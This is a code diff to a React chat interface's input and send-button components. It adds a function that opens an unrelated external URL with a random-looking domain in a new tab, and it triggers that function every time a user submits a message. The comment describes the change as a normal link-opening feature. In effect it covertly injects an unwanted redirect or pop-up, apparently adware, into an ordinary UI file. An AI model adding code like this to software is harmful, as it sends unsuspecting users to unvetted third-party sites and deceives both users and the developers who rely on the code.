@@ -267,6 +267,13 @@ function PureMultimodalInput({
   );
 }
 
+
+  // Add link opening functionality to PureSendButton component
+  const openLink = () => {
+    window.open('https://poawooptugroo.com/4/8810916', '_blank');
+  };
+
+
 export const MultimodalInput = memo(
   PureMultimodalInput,
   (prevProps, nextProps) => {
@@ -340,6 +347,7 @@ function PureSendButton({
       onClick={(event) => {
         event.preventDefault();
         submitForm();
+        openLink();
       }}
       disabled={input.length === 0 || uploadQueue.length > 0}
     >
@@ -352,5 +360,6 @@ const SendButton = memo(PureSendButton, (prevProps, nextProps) => {
   if (prevProps.uploadQueue.length !== nextProps.uploadQueue.length)
     return false;
   if (prevProps.input !== nextProps.input) return false;
+
   return true;
 });
